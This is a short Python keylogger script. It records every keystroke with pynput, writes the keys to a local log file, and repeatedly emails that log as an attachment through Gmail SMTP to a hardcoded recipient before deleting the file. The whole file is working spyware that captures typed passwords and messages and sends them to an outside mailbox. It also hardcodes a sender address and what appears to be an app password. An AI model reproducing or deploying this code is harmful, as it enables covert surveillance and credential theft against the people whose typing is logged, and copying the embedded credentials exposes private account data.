import os
import time
import smtplib
import ssl
import pynput
from pynput.keyboard import Key,Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

reciver_email="thivankanimesh@hotmail.com"
time_gap=10
screen_shots=False
web_records=False
web_cam=False
delete_log_file=False

sender_email="thivankanimshan@gmail.com"
sender_email_password="jmpomhnpxzcvtfyr"
program_started_time=0
last_mail_sent_time=time.time()
port = 587

overall_count =0

def on_press(key):
    global overall_count
    overall_count+=1
    write_file(key)
    

def on_release(key):
    sendMail()
    if(key==Key.esc):
        return False    

def write_file(key):
    with open('log.txt','a') as file:
        if(overall_count%10==0):
            file.write("\n")
        file.write(str(key))

def sendMail():
    global last_mail_sent_time
    global program_started_time

    file=open('log.txt')
    file_data=file.read()

    with smtplib.SMTP('smtp.gmail.com',port) as smtp:
        smtp.ehlo()
        smtp.starttls()
        smtp.ehlo()

        smtp.login(sender_email,sender_email_password)

        msg=MIMEMultipart()
        msg['Subject']='subject'
        msg['From']=sender_email
        msg['To']=reciver_email
        file='log.txt'

        msg.attach(MIMEText("Labour"))
        attachment=MIMEBase('application','octet-stream')
        attachment.set_payload(open(file,'rb').read())
        attachment.add_header('Content-Disposition','attachment; filename="%s"'%os.path.basename(file))
        msg.attach(attachment)

        print(time.time()-last_mail_sent_time)

        if((time.time()-last_mail_sent_time)>=time_gap):
            last_mail_sent_time=time.time()
            smtp.sendmail(sender_email,reciver_email,msg.as_string())
            print("message sent")
            os.remove("log.txt")


with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()